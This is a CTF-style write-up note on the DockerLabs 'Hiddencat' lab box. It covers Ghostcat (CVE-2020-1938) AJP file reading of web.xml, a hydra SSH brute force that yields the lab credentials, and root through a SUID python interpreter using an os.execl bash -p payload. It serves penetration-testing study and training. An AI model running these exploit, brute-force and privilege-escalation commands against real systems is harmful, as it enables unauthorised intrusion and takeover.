---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: [CVE-2020-1938]
tools: [nmap, whatweb, gobuster, hydra, ssh, find]
techniques: [information-gathering, directory-fuzzing, ajp-file-read, ssh-bruteforce, suid-enumeration]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[secretjenkins]]", "[[pequeñas-mentirosas]]", "[[autoescuela]]"]
---

# Hiddencat

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/hiddencat.md)

A Tomcat 9.0.30 box whose entire tell fits on one scan line: **`8009/ajp13` sitting next to `8080`** is the Ghostcat signature. [[cve-2020-1938]] turns that odd binary protocol into an arbitrary file reader, `WEB-INF/web.xml` hands over a username, rockyou supplies the password — and root is a single `find` away, because the only non-standard SUIDs on the box are **perl and python**.

## Path

1. **Recon** — `ping` + `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn` → **22** (OpenSSH 7.9p1 Debian 10+deb10u4), **8009** `ajp13` (Apache Jserv Protocol v1.3), **8080** (Apache Tomcat 9.0.30). The `-sC` pass on those three ports adds `ajp-methods: Supported methods: GET HEAD POST OPTIONS` — the protocol answers, it just isn't HTTP ([[information-gathering]], [[nmap]]).
2. **Fingerprint** — `whatweb http://172.17.0.2:8080` → `[200 OK] … Title[Apache Tomcat/9.0.30]`, confirming nmap's banner with an independent request ([[whatweb]]).
3. **Directory fuzz** — `gobuster dir` (DirBuster medium, `-x php,html,txt`) → **three hits, all 302**: `docs`, `examples`, `manager`, each `[--> /…/]` (Tomcat's slash-normalization redirect for its default apps). **All three were found and abandoned** — `/manager/html`, the classic default-credentials door, was never followed ([[directory-fuzzing]], [[gobuster]]).
4. **Research** — Tomcat 9 + file inclusion → online research lands on **CVE-2020-1938 (Ghostcat)** → `git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git` ([[cve-2020-1938]]).
5. **File read — the deployment descriptor** (Apache license header elided):

   ```
   python2 CVE-2020-1938.py 172.17.0.2 -p 8009 -f WEB-INF/web.xml
   Getting resource at ajp13://172.17.0.2:8009/asdf
   ----------------------------
   <?xml version="1.0" encoding="UTF-8"?>
     <display-name>Welcome to Tomcat</display-name>
     <description>
        Welcome to Tomcat, Jerry ;)
     </description>

   </web-app>
   ```

   The descriptor is the app's ID card — `<description>` names **jerry**. The read is used for **user enumeration**, not for a shell ([[ajp-file-read]], [[source-code-disclosure]]).
6. **SSH brute** — `hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -vV -t 64` → **`jerry:chocolate`** → `ssh jerry@172.17.0.2` ([[ssh-bruteforce]], [[hydra]], [[ssh]]).
7. **SUID sweep** — `find / -perm -4000 2>/dev/null` → the stock Debian set (`ping`, `umount`, `mount`, `su`, `chsh`, `chfn`, `newgrp`, `gpasswd`, `passwd`, `dbus-daemon-launch-helper`, `ssh-keysign`) **plus four that don't belong**: `/usr/bin/perl`, `/usr/bin/perl5.28.1`, `/usr/bin/python3.7`, `/usr/bin/python3.7m` ([[suid-enumeration]], [[find]]).
8. **Root** — the SUID interpreter *is* the payload:

   ```sh
   /usr/bin/python3.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
   whoami
   root
   ```

   `-p` is the whole trick: SUID sets the **effective** uid, and a normal exec drops it — `-p` tells the exec'd bash to preserve euid 0 ([[gtfobins]]).

## Credentials / secrets

| Secret | Where it came from |
|--------|--------------------|
| `jerry:chocolate` | `WEB-INF/web.xml` `<description>` ("Welcome to Tomcat, Jerry ;)") read over AJP → rockyou against `jerry` |

## Takeaways

- **An unusual protocol next to a named product version is a CVE dare.** `8009/ajp13` is Tomcat's *binary* front-end protocol — exposed here where it is normally localhost-only — and it appeared beside `Apache Tomcat 9.0.30`. One scan line carried both halves of the exploit: **look up CVEs for the odd port AND the product version, not just the version** ([[ajp-file-read]], [[information-gathering]]). Same reflex as [[autoescuela]], where the *listening* service named the CVE.
- **A file read is a user enumerator before it is anything else.** One file — the deployment descriptor — produced the username that made a full rockyou run tractable. Same derivation chain as [[secretjenkins]] (CVE file read → `/etc/passwd` → hydra): the read's first question is *who can I brute-force?* ([[source-code-disclosure]], [[ssh-bruteforce]]).
- **WEB-INF is invisible to HTTP — so fuzzing was the wrong tool, not a failed tool.** Files under `WEB-INF/` are never served to a browser by design; no wordlist will reach them. When gobuster comes back with nothing but default-app redirects, the content isn't behind a path — it's behind a **different protocol** ([[ajp-file-read]]).
- **Spot the non-standard SUIDs.** `find / -perm -4000` on Debian prints a short, boring, *familiar* list — perl and python are never on it. Score the output against the stock set instead of reading entries one at a time; the odd ones are the box ([[suid-enumeration]]).
- **`-p` vs no `-p` splits two privilege models.** [[pequeñas-mentirosas]]' `os.execl("/bin/bash", "bash")` worked because **sudo** already ran it in root's context; here the interpreter is **SUID**, so the payload itself must preserve euid via `"-p"` — one argument apart, and the difference between root and a normal shell ([[gtfobins]]).
- **Three 302s, one door never opened.** `docs/`, `examples/`, `manager/` all answered and all were abandoned — `/manager/html` with default credentials (`tomcat:s3cret` family) is the standard Tomcat first try and cost nothing to check ([[directory-fuzzing]]).

## Gaps in the writeup

- **No flags on record** — the transcript ends at `whoami` → `root`; no `user.txt`/`root.txt` path appears anywhere.
- **The three 302s were never followed.** `docs/`, `examples/`, and `manager/` were found and abandoned — the Tomcat **manager default-credentials path** (the classic next move on any Tomcat box) was never attempted, so a possibly easier foothold was skipped.
- **Only one file was read.** `-f WEB-INF/web.xml` worked and nothing else was tried — no `/etc/passwd`, no `WEB-INF/classes/*.properties`, no other application paths — the reader's full reach was never probed.
- **The perl SUIDs were never exercised.** `/usr/bin/perl` and `/usr/bin/perl5.28.1` were spotted in the same output as python and then ignored; perl is a [[gtfobins]] entry too — a second root path left on the table.
- **No `sudo -l`** appears anywhere as jerry — the standard post-foothold check was not run.
- **The CVE lookup is a one-line assertion** — *"Researching online found Tomcat 9 is vulnerable to file inclusion"* — with no search trail, advisory, or affected-range comparison recorded (the PoC repo link is the only evidence).
